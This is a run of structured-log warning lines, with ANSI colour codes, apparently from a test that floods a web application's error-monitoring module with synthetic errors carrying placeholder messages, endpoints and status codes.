WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.880012Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m72[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3578'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_78[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m578[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.880064Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m72[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3579'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_79[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m579[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.880119Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m72[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3580'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_80[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m580[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.880169Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m72[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3581'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_81[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m581[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.880219Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m72[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3582'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_82[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m582[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.880268Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m72[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3583'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_83[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m583[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.880318Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m72[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3584'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_84[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m584[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.880367Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m72[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3585'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_85[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m585[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.880416Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m72[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3586'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_86[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m586[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.880464Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m72[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3587'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_87[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m587[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.880513Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m72[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3588'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_88[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m588[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.880562Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m72[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3589'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_89[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m589[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.880610Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m72[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3590'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_90[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m590[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.880659Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m72[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3591'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_91[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m591[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.880710Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m72[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3592'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_92[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m592[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.880763Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m72[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3593'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_93[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m593[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.880815Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m72[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3594'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_94[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m594[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.880865Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m72[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3595'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_95[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m595[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.880915Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m72[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3596'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_96[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m596[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.880965Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m72[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3597'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_97[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m597[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.881014Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m72[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3598'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_98[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m598[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.881063Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m72[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3599'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_99[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m599[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.881111Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m73[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3600'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_0[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m400[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.881159Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m73[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3601'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_1[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m401[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.881209Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m73[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3602'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_2[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m402[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.881257Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m73[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3603'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_3[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m403[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.881306Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m73[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3604'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_4[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m404[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.881355Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m73[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3605'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_5[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m405[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.881433Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m73[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3606'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_6[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m406[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.881520Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m73[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3607'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_7[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m407[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.881586Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m73[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3608'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_8[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m408[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.881686Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m73[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3609'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_9[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m409[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.881755Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m73[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3610'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_10[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m410[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.881811Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m73[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3611'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_11[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m411[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.881862Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m73[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3612'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_12[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m412[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.881918Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m73[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3613'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_13[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m413[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.881971Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m73[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3614'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_14[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m414[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.882020Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m73[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3615'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_15[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m415[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.882068Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m73[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3616'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_16[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m416[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.882116Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m73[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3617'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_17[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m417[0m
